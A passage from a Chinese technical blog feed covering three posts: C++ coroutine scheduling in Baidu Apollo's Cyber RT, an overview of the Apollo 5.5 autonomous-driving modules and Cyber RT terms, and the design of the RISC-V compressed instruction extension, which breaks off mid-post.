从优先级最高的队列开始遍历</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = MAX_PRIO - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; --i) &#123;<br>   <span class="hljs-comment">// 2. 获取当前优先级队列的锁</span><br>    <span class="hljs-function">ReadLockGuard&lt;AtomicRWLock&gt; <span class="hljs-title">lk</span><span class="hljs-params">(lq_-&gt;at(i))</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; cr : multi_pri_rq_-&gt;<span class="hljs-built_in">at</span>(i)) &#123;<br>      <span class="hljs-keyword">if</span> (!cr-&gt;<span class="hljs-built_in">Acquire</span>())<br>        <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-comment">// 3. 返回状态就绪的协程</span><br>      <span class="hljs-keyword">if</span> (cr-&gt;<span class="hljs-built_in">UpdateState</span>() == RoutineState::READY)<br>        <span class="hljs-keyword">return</span> cr;<br>      cr-&gt;<span class="hljs-built_in">Release</span>();<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>&#125;<br><span class="hljs-comment">// Choreography 的调度策略的 NextRoutine() </span><br><span class="hljs-function">std::shared_ptr&lt;CRoutine&gt; <span class="hljs-title">ChoreographyContext::NextRoutine</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">cyber_unlikely</span>(stop_.<span class="hljs-built_in">load</span>()))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>  <span class="hljs-function">ReadLockGuard&lt;AtomicRWLock&gt; <span class="hljs-title">lock</span><span class="hljs-params">(rq_lk_)</span></span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> it : cr_queue_) &#123;<br>    <span class="hljs-keyword">auto</span> cr = it.second;<br>    <span class="hljs-keyword">if</span> (!cr-&gt;<span class="hljs-built_in">Acquire</span>())<br>      <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-keyword">if</span> (cr-&gt;<span class="hljs-built_in">UpdateState</span>() == RoutineState::READY)<br>      <span class="hljs-keyword">return</span> cr;<br>    cr-&gt;<span class="hljs-built_in">Release</span>();<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>我们仔细比较一下上文的两个函数，emm……乍一看似乎没什么区别，确实，但细节往往隐藏了海量信息。注意到，<code>ClassicContext</code> 使用的队列是 <code>multi_pri_rq_</code>，<code>ChoreographyContext</code> 使用的队列是 <code>cr_queue_</code> ，两者类型如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">using</span> CROUTINE_QUEUE = std::vector&lt;std::shared_ptr&lt;CRoutine&gt;&gt;;<br><span class="hljs-keyword">using</span> MULTI_PRIO_QUEUE = std::array&lt;CROUTINE_QUEUE, <span class="hljs-number">20</span>&gt;;<br><span class="hljs-keyword">using</span> CR_GROUP = std::unordered_map&lt;std::string, MULTI_PRIO_QUEUE&gt;;<br><br>MULTI_PRIO_QUEUE *multi_pri_rq_;<span class="hljs-comment">// 这是 ClassicContext 内的一个私有成员</span><br>std::multimap&lt;<span class="hljs-type">uint32_t</span>, std::shared_ptr&lt;CRoutine&gt;, std::greater&lt;<span class="hljs-type">uint32_t</span>&gt;&gt; cr_queue_;<br><span class="hljs-built_in">alignas</span>(CACHELINE_SIZE) <span class="hljs-type">static</span> CR_GROUP  cr_group_;<br></code></pre></td></tr></table></figure><p>看清楚了吧，事实上 <code>ClassicContext</code> 使用了多个优先级队列，而<code>ChoreographyContext</code> 用的“队列”只是了一个表（对于 <code>multimap</code> 和 <code>map</code> ，我更喜欢用表格称呼它们）。如果你想进一步了解 <code>multi_pri_rq_</code>，那么可以仔细看一下下面这张图。再结合上面的代码，可以得出两点结论：</p><ul><li><code>CR_GROUP</code> 相当于组名与优先级队列的表格，是一个全局变量，有序地存放了系统中所有的协程。所以说，在 Classic 策略中，“协程是放在全局的优先级队列中处理的”。</li><li>每一个协程组与一个 <code>ClassicContext</code> 对象对应，一个 <code>ClassicContext</code> 也与一个 <code>Processor</code> 绑定，即与一个线程绑定。这就是我前文所说的“相关协程以组为单位与线程做绑定”的直接证据。</li></ul><center><img src="/img/scheduler_data.png" style="zoom:50%;" /></center>而反观 Choreography 策略，`ChoreographyContext` 只管理那些**主链路**上的协程（任务），不会对协程进行分组。而对于非主链路上的任务，Choreography 策略会把它们扔给 `ClassicContext` 上下文处理。<p>说完这个，我们再看看 <code>Processor</code> 的线程阻塞和唤醒是怎么操作的：没错，通过上下文的 <code>Wait()</code> 和 <code>Notify()</code> 函数 :man_shrugging:。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ClassicContext::Wait</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-comment">// 1. 获取锁</span><br>  <span class="hljs-function">std::unique_lock&lt;std::mutex&gt; <span class="hljs-title">lk</span><span class="hljs-params">(mtx_wrapper_-&gt;Mutex())</span></span>;<br>  <span class="hljs-comment">// 2. 等待条件大于0</span><br>  cw_-&gt;<span class="hljs-built_in">Cv</span>().<span class="hljs-built_in">wait_for</span>(lk, std::chrono::<span class="hljs-built_in">milliseconds</span>(<span class="hljs-number">1000</span>),<br>                     [&amp;]() &#123; <span class="hljs-keyword">return</span> notify_grp_[current_grp] &gt; <span class="hljs-number">0</span>; &#125;);<br>  <span class="hljs-comment">// 3. 对应协程组的唤醒条件减1</span><br>  <span class="hljs-keyword">if</span> (notify_grp_[current_grp] &gt; <span class="hljs-number">0</span>) &#123;<br>    notify_grp_[current_grp]--;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ClassicContext::Notify</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string&amp; group_name)</span> </span>&#123;<br>  <span class="hljs-comment">// 1. 加锁</span><br>  (&amp;mtx_wq_[group_name])-&gt;<span class="hljs-built_in">Mutex</span>().<span class="hljs-built_in">lock</span>();<br>  <span class="hljs-comment">// 2. 协程唤醒条件加1</span><br>  notify_grp_[group_name]++;<br>  (&amp;mtx_wq_[group_name])-&gt;<span class="hljs-built_in">Mutex</span>().<span class="hljs-built_in">unlock</span>();<br>  <span class="hljs-comment">// 3. 唤醒线程</span><br>  cv_wq_[group_name].<span class="hljs-built_in">Cv</span>().<span class="hljs-built_in">notify_one</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>看来唤醒和等待都是通过上下文的条件变量 <code>cw_</code> 实现的，对于 Choreography 策略来说，实现也是类似的。</p><h3 id="整体结构">整体结构</h3><p>现在，我们跳出这些恼人的代码，俯视整个调度结构。幸运的是，参考文献 [1] 已经提供了两张非常好的图片：我在这里也不厌其烦地重复说一下吧😓</p><ul><li>调度系统中，<code>Scheduler</code> 类统管了所有资源，很显然，它必然是单例。</li><li>每个 <code>Processor</code> 封装了一个 <code>std::thread</code> ，并于一个 <code>ProcessorContext</code> 对象绑定。</li><li>切换协程（任务）由上下文完成，过程几乎都是优先级从高到底遍历，选中已经就绪的协程开始运行。</li><li>在一个完整的动作流程中，任务的优先级几乎都是从低到高的。</li><li><code>Choreography</code> 调度策略，主要是针对主链路上的任务进行编排，这些任务会被分配到程序员指定的 <code>Processor</code> 上，且执行先后关系明确，需要对系统有足够深入的了解。</li></ul><center><img src="/img/classic.png" /></center><center><img src="/img/choreograph.png" /></center><h2 id="参考文献">参考文献</h2><p>[1] <a href="https://blog.csdn.net/jinzhuojun/article/details/104087518">自动驾驶平台Apollo 5.5阅读手记：Cyber RT中的任务调度</a></p><p>[2] <a href="https://github.com/ApolloAuto/apollo/blob/master/docs/cyber">百度 Apollo Cyber Docs</a></p><p>[3] <a href="https://github.com/daohu527/Dig-into-Apollo">Dig-into-Apollo</a></p><p>[4] <a href="https://learnku.com/articles/41728">Golang 中的协程</a></p><p>[5] <a href="https://blog.csdn.net/jinzhuojun/article/details/86760743">自动驾驶平台Apollo 3.5阅读手记：Cyber RT中的协程</a></p>]]></content>
    
    
    <categories>
      
      <category>Apollo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Apollo</tag>
      
      <tag>Cyber RT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apollo 软件系统概述</title>
    <link href="/2020/10/14/2020-10-14-apollo-intro/"/>
    <url>/2020/10/14/2020-10-14-apollo-intro/</url>
    
    <content type="html"><![CDATA[<h1>百度 Apollo 5.5 自动驾驶软件系统概述</h1><p>由于课题组研究需要，博主这段时间一直在研究百度的 Apollo 自动驾驶系统，其中有一些成果和感悟，放在这里与大家分享，也算作一个研究笔记吧。</p><h2 id="什么是-Apollo？">什么是 Apollo？</h2><p><a href="https://apollo.auto/">Apollo</a> 是百度开发的自动驾驶开源框架，其特点是高性能和灵活的架构，可以加速对自动驾驶的开发、测试、部署流程。博主这次主要介绍一下 <a href="https://github.com/ApolloAuto/apollo">Apollo 5.5</a> 的软件架构。下面是整个 Apollo 代码的目录结构，主要是按照功能模块划分：</p><ul><li><p>cyber 消息中间件，替换 ROS 作为消息层</p></li><li><p>docker 容器相关</p></li><li><p>docs 文档相关</p></li><li><p>modules 自动驾驶模块，主要的定位，预测，感知，规划都在这里</p><ul><li>calibration 校准模块，主要用于传感器坐标的校准，用于感知模块做传感器融合</li><li>canbus 通讯总线，接受并执行控制模块的指令，以及收集汽车的底盘状态进行反馈</li><li>common 集合了一些常用到的基本功能</li><li>contrib</li><li>control 控制模块，顺着规划生成的路径，对车辆轨迹进行控制，它发送机械控制命令到 Can 总线，实现车辆的控制</li><li>data 地图等生成好的数据放在这里（其他数据待补充）</li><li>dreamview 仿真，能够对自动驾驶过程中的数据进行回放，其他厂家也有推出一些仿真平台，后面有机会再介绍下</li><li>drivers 雷达，lidar，GPS, canbus，camera等驱动</li><li>guardian 监护模块，万一出现软硬件故障，可以采取相应处理的措施保证安全</li><li>localization 定位模块，融合 GPS、IMU、LiDAR等设备，获取汽车的定位信息</li><li>map 地图模块</li><li>monitor 监控模块，接受来自各个模块的数据和状态，传送到人机交互接口，可以及时地将自动驾驶车辆的各个软硬件设备情况告知驾驶员</li><li>perception 感知模块，获取汽车当前的环境，行人，车辆，红绿灯等，给planning模块规划线路</li><li>planning 规划模块，针对感知到的情况，对自动驾驶车辆规划时空轨迹，与路由模块不同，这指的是短期规划</li><li>prediction 预测模块，对障碍物的轨迹做预测</li><li>routing 路由模块，对目的地进行导航，查询走过的路线图</li><li>third_party_perception 第三方感知模块</li><li>tools 工具，这里面的工具有很多，有机会可详细介绍</li><li>transform 转换</li><li>v2x（vehicle-to-everything）其希望实现车辆与一切可能影响车辆的实体实现信息交互，能减少事故发生，减缓交通拥堵，降低环境污染以及提供其他信息服务</li></ul></li><li><p>scripts 脚本</p></li><li><p>third_party 第三方库</p></li><li><p>tools 工具目录</p></li></ul><h2 id="安装与构建">安装与构建</h2><p>在开始前，你需要一个 Ubuntu 操作系统和 Apollo 源码。<a href="https://github.com/ApolloAuto/apollo/blob/master/docs/specs/prerequisite_software_installation_guide.md">官方的准备内容</a>非常详细，这里不再罗列。</p><p><a href="https://github.com/ApolloAuto/apollo/blob/master/docs/quickstart/apollo_software_installation_guide.md">Apollo 的 构建与运行文档</a>也非常详细。值得注意的是，考虑到github下载速度过慢，国内用户推荐使用<a href="https://github.com/ApolloAuto/apollo/blob/master/docs/howto/how_to_clone_apollo_repo_from_cn.md">gitee</a>。</p><h2 id="软件架构概览">软件架构概览</h2><p>下图是 Apollo 5.5 的软件架构图，软件平台包括各个模块以及 Cyber RT 框架和 ROS 系统。<strong>在本篇博文中，这次我重点关注的是建立在 Cyber RT 上的软件模块部分</strong>。为了充分了解工作原理，可能还会涉及到一些自动驾驶的硬件方面的知识。</p><p><img src="/img/Apollo_5_5_Architecture.png" alt=""></p><p>博主从 <a href="https://github.com/ApolloAuto/apollo/blob/r5.5.0/docs/specs/Apollo_3.5_Software_Architecture.md">Apollo 官方文档</a>中找到了软件系统模块之间的关系图。每个模块都作为独立的 CarOS-based 的 ROS 节点运行。 每个模块节点都发送和接受某些消息。 接下来，我会对各个模块作专门的介绍，并了解他们之间的交互作用。不同于官方文档，我尽量避开技术细节，用更加通俗的语言去阐述各个模块的功能。</p><p><img src="/img/Apollo_3_5_software_architecture.png" alt=""></p><h3 id="Perception">Perception</h3><p>感知模块。相当于自动驾驶车辆的眼睛和耳朵，这是自动驾驶系统获取外界信息的主要模块，是不可或缺的部分。该模块主要感知（或者说把注意力集中在）行车时遇到的<strong>障碍物、交通信号灯、车道线、交通标志</strong>等。这很容易理解，因为人在驾驶时也需要注意这些事物，机器也一样。</p><p>感知模块需要调用的硬件设备主要是<strong>摄像机、激光雷达和雷达</strong>。这其中就涉及到深度学习识别图像技术，以及激光雷达测距技术和雷达点云阵列建模技术等。在一开始，我认为不需要深入理解这些技术在干嘛，需要了解的是，感知模块在得到硬件设备的输入后，会输出交通信号灯的指示和感知范围内障碍物的距离、速度、位置等信息。</p><h3 id="Prediction">Prediction</h3><p>正如那张关系图绘制的那样，在接受到感知模块传来的信息时，预测模块会首先开始工作，自动驾驶系统必须和人类一样，能对场景中未来一段时间可能发生的情况进行正确而又适当的判断。预测模块就必须做到这一点，为此，它将于<a href="#Planning">规划模块</a>、<a href="#Localization">定位模块</a>等一起合作，给汽车下达一些合适的指令。</p><p>预测模块中内置了一个复杂的预测数学模型，该数学模型通过对接收到的信息进行分析，再结合目前的场景，给出各个物体的可能速度和路径的概率，进而预测物体的时空轨迹。</p><span id="Planning">### Planning<p>规划模块。它负责为自动驾驶车辆规划一条可行的时空轨迹。为了完成这一艰巨的任务，规划模块需要</p><ul><li>自动驾驶车辆的自身状态，例如速度、位置、朝向、加速度等</li><li>地图相关信息，例如道路基础设施、交通灯、交通标志和导航信息</li><li>周围的障碍物情况，例如周围车辆、行人、非机动车等未来可能的状态</li></ul><p>参考<a href="https://github.com/ApolloAuto/apollo/blob/master/modules/planning/README.md">规划模块的相关文档</a>，在5.5版本前，规划模块在不同的场景下，使用了相同的配置和参数进行规划。在5.5版本中，Apollo 聚焦于城市街道上的 curb-to-curb 自动驾驶，引入了两个新的规划场景。而在6.0版本中，Apollo 引入了两种新的规划模式：E2E 模式和混合模式。这两个模式都采用了基于学习的方法，对未来的行车轨迹进行规划。</p><p>从<a href="https://github.com/ApolloAuto/apollo/blob/master/modules/planning/README.md">文档</a>中可进一步了解到，Apollo 团队目前正聚焦于五种重要场景的解决，分别是沿车道线行驶、十字路口会车、找到停车位停车、从停车位离开和避让紧急车辆。</p><h3 id="Control">Control</h3><p>根据规划轨迹和汽车的当前状态，控制模块使用不同的控制算法，尽可能地给乘客带来舒适的驾驶体验。控制模块可以在常规和导航模式下工作。它要求的输入有：</p><ul><li>规划好的时空轨迹</li><li>自动驾驶车辆的状态</li><li>定位信息</li></ul><p>控制模块在接收到完整的信息后，会使用控制算法产生一系列诸如油门、刹车、转向等控制命令。</p><h3 id="CANBus">CANBus</h3><p>总线部分，用于传递控制指令到汽车的底盘上，这可能是汽车工业的总线。除了传达控制指令之外，它还会收集汽车底盘的状态信息，并反馈给控制模块等，用于矫正可能出现的偏差。</p><span id="Localization">### Localization<p>定位模块有两种方式提供定位服务：</p><ul><li>RTK（Real Time Kinematic），整合了 GPS 和 IMU（惯性测量单元）信息</li><li>多感知器融合的方案，在 RTK 的基础上加入了 LiDAR 信息</li></ul><p>输出的当然就是车辆的精确位置了。</p><h3 id="Miscellaneous">Miscellaneous</h3><ul><li>HMI 人机交互接口，包括驾驶时的显示器和 DreamView（用于回看自动驾驶过程），主要功能是可视化地查看车辆驾驶的状态、测试模块、提供调试工具，以及方便司机实时地控制车辆的行驶等。</li><li>Monitor 接收来自不同模块的数据，传给 HMI 给司机查看；监管各个软硬件系统</li><li>Guardian 会根据 Monitor 传来的信息，决定采取何种行动来保证安全</li><li>HD-Map 用于查询，提供关于道路情况的特制结构化信息</li><li>StoryTelling 用于隔离和管理复杂的场景，考虑到某些场景在真实情况下实验可能会发生危险，该模块就虚拟地创建可以触发多个模块动作的场景情况。</li></ul><h2 id="什么是-Cyber-RT">什么是 Cyber RT</h2><p>Apollo Cyber RT 是一个专门为自动驾驶场景设计的开源、高性能<strong>运行时框架</strong>。基于集中式计算模型，大大提升了自主驾驶的高并发性、低延迟性和高吞吐量。</p><p>简单来说，Cyber 是百度 Apollo 推出的替代 ROS 的消息中间件，自动驾驶中的各个模块通过 Cyber 进行消息传输，同时 Cyber 还提供了任务调度、录制Bag包等功能。</p><p>那么为什么百度 Apollo 团队要花大力气开发 Cyber RT呢？<a href="https://github.com/ApolloAuto/apollo/blob/master/cyber/README.md">官方文档</a>上是这么说的：</p><blockquote><p>During the last few years of the development of autonomous driving technologies, we have learned a lot from our previous experience with Apollo. The industry is evolving and so is Apollo. Going forward, Apollo has already moved from development to productization, with volume deployments in the real world, we see the demands for the highest level of robustness and performance. That’s why we spent years building and perfecting Apollo Cyber RT, which addresses that requirements of autonomous driving solutions.</p></blockquote><p>总结一下，就是多年的开发经验以及现实世界中的自动驾驶系统的批量部署，Apollo 团队认识到了自动驾驶对健壮性和性能的最高水平的需求，所以开发了 Cyber RT。</p><p>简单地说说它的优点：</p><ul><li>加快开发。有一系列的开发工具，大量的感知器驱动和便利的数据任务接口</li><li>易于部署。有高效和自适应的消息通信，可配置的用户级调度器以及相比之下更少的依赖项</li><li>可个性化扩展。开源的运行时架构和为自动驾驶设计的模块化编程方式，可以方便用户个性化的自动驾驶系统</li></ul><h2 id="相关术语介绍">相关术语介绍</h2><p>在这一小节，我参考<a href="https://github.com/ApolloAuto/apollo/blob/master/docs/cyber/CyberRT_Terms.md">百度 Apollo 文档</a>，先给大家讲解一下 Cyber RT 中经常出现的术语。</p><h3 id="Component">Component</h3><p>组件，简单的来说就是一个算法模块。在自动驾驶系统中，感知、定位、控制系统等<strong>模块</strong>以组件 (Component) 的形式存在于 Cyber RT 下，每个组件通过网络通道 (Channel) 与其他组件进行通信。组件的概念不仅对模块进行了解耦，还提供了将模块划分为组件的设计灵活性。</p><p>Cyber RT 为开发者提供了 Component 类簇，开发者的算法业务模块只需要继承相关的Component 类，并实现其中的接口即可，主要是关于实现算法、消息处理相关的逻辑。除此之外，Cyber RT 基于协程（后面我们会提到），为开发者提供了并行计算相关的接口。</p><h3 id="Node">Node</h3><p>节点是 Cyber RT 的基础构件；每个模块都包含节点，它能够基于信道、服务等功能与其他节点进行通信。各个节点之间进行通信即可形成拓扑关系，并完成指定任务。通过使用节点，可将代码和功能解耦，提高了系统的容错能力和可维护性，使系统简化。同时，节点允许了 Cyber RT 能够布置在任意多个机器上并同时运行。</p><h3 id="Channel">Channel</h3><p>信道。在 Cyber RT 中，若需要完成节点之间的通信，则需要建立一条信息传输通道，这被称为信道。节点可以将消息发送进入某一指定的信道之中，若有其他节点定义接口接收此信道消息，则可完成消息收发过程。若没有，则消息也依然存在于信道之中。</p><h3 id="Reader-Writer">Reader/Writer</h3><p>若需要完成基于信道的通信，首先需要定义消息的发送方（Writer）和接收方（Reader），以保证消息可以通过 Writer 和 Reader 共同指定的 Channel ，从一个节点传输到另一个节点。这类通信方式称之为基于信道的通信（也成发布—订阅通信），有如下特点：</p><ul><li>同一个节点可以同时发送多条消息，也可以同时接收多条消息，即可以同时定义多个 Writer 和 Reader</li><li>基于信道的通信是一种单向通信，消息只能由 Writer 传输到 Reader，而不能够反向传输</li><li>信道中的消息不需要实时应答，也就是说，当某一条消息通过 Writer 送入 Channel 后，可以没有 Reader 来读取消息。当某一个 Reader 想要读取 Channel 中的信息时，Channel 中也许并没有消息输入</li></ul><h3 id="Task-与-CRoutine">Task 与 CRoutine</h3><p>任务 (Task) 是对 Cyber RT 中异步计算任务的抽象描述。</p><p>CRoutine 就是指的协程 (Coroutine) ，Cyber RT 实现了 CRoutine 来优化线程的使用和系统资源的分配。</p><h3 id="Service-Client">Service/Client</h3><p>基于服务（Service）的通信是 Cyber RT 中的另一种通信方式，与信道通信相同，基于服务的通信也需要有消息的收发节点。但与信道不同的是，服务需要两个节点之间完成请求或应答才可完成通信。</p><p>在自动驾驶系统中，除了各节点的消息发送和接收之外，很多场景还需要在节点之间进行双向通信，并能够获得应答。这就需要利用服务来通信。不同于 Channel 的通信方式，Service 的一个节点如果想要获取信息，需要给另一个节点发送请求，以此来获取响应，这就完成了节点之间的双向通信。在 Service 中，发送请求的一方为客户端（Client），接收请求的一端为服务端（Server）。</p><h2 id="结语">结语</h2><p>这篇博客粗略介绍了一下 Apollo 系统的各个软件模块以及 Cyber RT 的相关术语。接下来，根据课题组的具体要求，我会深入到 Cyber RT，继续研究 Apollo 自动驾驶系统。</p><h2 id="参考文献">参考文献</h2><p>[1] <a href="https://github.com/daohu527/Dig-into-Apollo">Dig into Apollo</a></p><p>[2] <a href="https://github.com/ApolloAuto/apollo">Apollo 官方文档</a></p>]]></content>
    
    
    <categories>
      
      <category>Apollo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Apollo</tag>
      
      <tag>Software System</tag>
      
      <tag>module</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Why RISC-V ?</title>
    <link href="/2020/09/27/2020-9-27-WHY%20RISC-V%204/"/>
    <url>/2020/09/27/2020-9-27-WHY%20RISC-V%204/</url>
    
    <content type="html"><![CDATA[<h1>Why RISC-V ?</h1><p>在讲完 RISC-V 的基础 ISA 和标准扩展后，我们把注意力集中到 <strong>RISC-V C</strong> 上，RISC-V Compressed 简称 <strong>RVC</strong> ，<u>它在基础 ISA 中引入了双长度指令，将最频繁的指令编码为更密集的格式来减少静态代码大小和动态取指令的流量</u>。因为更小的指令占用空间可以降低嵌入式系统的成本（指令存储在嵌入式系统中的成本非常可观），并提高了指令缓存的命中率，提升了缓存系统的性能。取指令消耗了大部分能量，因此从内存中取出更短的指令（意味着更少的字节），也可以显著减少能量消耗。</p><h2 id="背景介绍">背景介绍</h2><p>在嵌入式系统领域，有限的指令内存容量和带宽往往不利于 RISC 架构。为了扩大他们的市场，RISC 供应商给 MIPS 和 ARM 创造了他们的 ISAs 的变种，分别叫做 MIPS16 和 Thumb，它们可以被编码为更窄的 16 位固定宽度指令。这些指令中的大多数与基本 ISA 相似，但对寄存器访问模式和操作数大小有限制。虽然这些压缩的 RISC ISAs 大大降低了代码大小，但它们也有一些缺点。最重要的是，基础 ISAs 的设计者没有考虑到这些压缩指令集：没有充足的编码空间给压缩的指令，因此唯一方法是创建新的、不兼容的指令集。但这就无法与基础 ISAs 混合在一起执行。例如，在 MIPS16 中，ISAs 只能用特殊的跳转指令交换，因此 MIPS 和 MIPS16 代码只在过程调用时混合。</p><p><u>不可与基本 ISA 指令混用对性能有显著的影响</u>。因为有些操作可以很容易地编码在一条 32 位的指令中，比如加载一个大的常量。<u>但现在就可能需要三条 16 位的指令，而且保存额外的中间结果会使压缩的 ISAs 的寄存器数量更加捉襟见肘，此外，用 16 位编码整个 ISA 意味着重要的功能，如浮点，必须被忽略</u>。后来压缩 RISC ISA 变体，如 microMIPS 和 Thumb-2，纠正了这个缺陷，设计了新的 32 位指令，并允许 16 位和 32 位的指令混用。然而因为 32 位指令仍然与基础 ISA 中的指令不一样，所以实现工程师被迫设计和验证两个指令译码器，增加了硬件成本，大大增加了软件生态系统的复杂性。</p><h2 id="对基础-ISA-的影响">对基础 ISA 的影响</h2><p>有了前车之鉴，我们在设计 RISC-V 时在一开始就考虑了如何无缝地支持双长度的指令。当然至关重要的前提是，基本 ISA 和标准扩展只占其编码空间的一小部分，可以给压缩指令充足的编码空间。不像早期的 RISC ISAs 那样，密集地填充着 32 位的编码空间，比如 SPARC，花了 1/4 编码空间在 CALL 指令，<u>相比之下，RISC-V 的基本 ISA 编码消耗小于 1/4 的 32 位编码空间</u>。我们有意识地保留了 3/4 的空间，留给压缩 ISA 扩展指令。这样编码的另一个重要结果是，我们很容易检测一条指令的长度是 16 位还是 32 位：只需要检查两个操作码位。该方案极大地加快了超标量指令的译码速度，因为它要求对指令进行连续扫描以确定其边界。</p><p>另外，<u>RISC-V 的基本控制流指令的最小寻址单位是 16 位，而不是 32 位。这样的设计也是为了压缩指令的扩展考虑的</u>——在支持压缩指令时，RISC-V 就不要新增分支和跳转指令。更进一步，我们发现支持任意字节对齐的指令也是很简单的。然而，我们发现 16 位指令就可以节省很多成本了， 8 位和 24 位指令带来的好处，与取指令单元中增加的硬件复杂性相比，可能是不太明智的。更重要的是，这将进一步减小分支和跳转的范围，从而增加了指令数，抵消了新指令宽度所带来的一些代码大小和性能改进。</p><p>为了支持 RVC，<u>基础 ISA 唯一改变的是放松了指令的对齐限制，允许它们在任何 16 位对齐的地方开始</u>。显然，保持对齐限制会有一些好处，因为它可以简化指令获取硬件。但是这样做，我们被迫放弃很多代码密度的提升效果。虽然该影响可以通过代码调度在某种程度上减轻，但是对编译器进行这样的额外约束，会出现更多的数据冒险并降低性能，特别是对于静态调度的实现。</p><h2 id="RVC-设计理念">RVC 设计理念</h2><p>两个主要的设计理念引导着 RVC 的设计。<u>首先，RVC 程序不应该比对应的 RISC-V 程序使用更多的指令，并在性能上也至少如此</u>。这个目标很容易实现——保证基本 ISA 指令总是可用的就行。这种设计带来的结果是，RVC 不是一个独立的 ISA，因此宝贵的 RVC 编码空间可以不用花在基本但相对不频繁的操作上，比如用系统调用调用操作系统，而花在可以减小最常见代码序列的规模上。</p><p><u>第二点，每个 RVC 指令必须可扩展为单个 RISC-V 指令</u>。提出这条的原因有两方面，最重要的是，它简化了 RVC 处理器的实现和验证：在指令译码期间，RVC 指令可以简单地扩展为对应的基础 ISA 指令，这样一来，处理器的后端就可以几乎不知道 RVC 指令的存在。此外，汇编程序员和编译器也不需要知道 RVC：代码压缩可以留给汇编器和链接器（当然，若编译器对 RVC 了解更多，也可以为代码压缩提供更多优化）。然而，这种约束确实阻止了一些重要的代码大小优化：比如 load-multiple 和 store-multiple 指令，这是其他压缩 RISC ISAs 的共同特性，不适合此模板。</p><p>设定了这两个理念之后，RVC 的设计问题就被简化成了压缩率与译码成本的 tradeoff 的问题。在极端情况下，我们可以将每个可用的 RVC 编码映射到常见的 RISC-V 编码，甚至做出一个指令翻译“字典”。虽然这可以达到最大的压缩率，但有三个主要缺点：字典查找是昂贵的，抵消了取指令节省的能源；增加了指令解码的延迟，可能会降低性能并进一步抵消所节省的能源；最后，字典添加到架构中，会增加上下文切换时间和内存使用。</p><p>幸好，RISC-V 指令流的四个属性使得上述方法没有必要：</p><ul><li><p><em>指令中的寄存器有巨大的空间局部性</em>。RISC-V 提供了充足的寄存器数量，减少寄存器数量不足导致的溢出、内存交换等。但即使如此，多数访问仍集中在对少数寄存器。下图展示了在 SPEC CPU2006 benchmark 中寄存器的使用频率。</p><center>  <img src="/img/reg_freq.png" /></center></li><li><p><em>指令只有很少的唯一操作数</em>。一些指令集，比如 Intel 80x86 ，只提供很多破坏性的操作形式：其中的一个源操作数会被结果覆盖。这实质上增加了一些程序的指令数量，因此 RISC-V 的指令都是寄存器——寄存器的非破坏性形式。但是，破坏性算术操作是常见的：SPEC CPU2006 中 47% 的静态算术指令与目标寄存器共享至少一个源操作数。但是，RISC-V 指令只需要通过一些小技巧就可以表达常见的用法。例如，当 ADDI 指令的一个源操作数是 <code>x0</code> 时，事实上就是将一个小常量装载到了目的寄存器中。</p></li><li><p><em>立即数和偏移量都往往很小</em>。大约一半的立即数可以用 5 位表示。静态的，分支和跳转的偏移量通常很大；然而，动态的，几乎 90% 的都在 8 位以内，反映了小循环的优势。此外，由于这些数据是从未压缩的 RISC-V 程序中收集的，因此分支和跳跃的偏移是 RVC 程序的两倍。实际上，对于 RVC 程序，CDFs 最多可以向左移 1 位。</p></li><li><p><em>一小部分独特的操作码占主导地位</em>。在 SPEC CPU2006（74%）中，绝大多数静态指令是整数装载、加法、存储或分支。如下表所示，20 种最常见的 RISC-V 操作码占静态结构的 91%，占动态指令的 76% 。最常见的指令 ADDI，静态地占指令的四分之一，动态地占七分之一。</p><center>  <img src="/img/instr_freq.png" /></center></li></ul><p>根据这些观察结果，我们提出了一种 RVC 设计，它可以表达最常见指令的最常见形式，同时保留编码规则，从而简化实现。</p><h2 id="RVC">RVC</h2><p><u>在 RISC-V Compressed ISA 的扩展中，指令使用了 5 位进行编码，目前我们使用了 24 个操作码，占用了编码空间的 3/4 ，留下 11 位给操作数编码</u>。下表列出了主要 RVC 指令的编码格式；几种次要格式在立即数的编码上有所不同。CR、CI 和 CSS 格式可以访问所有的 32 个寄存器，通常为最常见的操作保留，比如复制寄存器或访问堆栈。</p><center>  <img src="/img/major_RVC_formats.png" 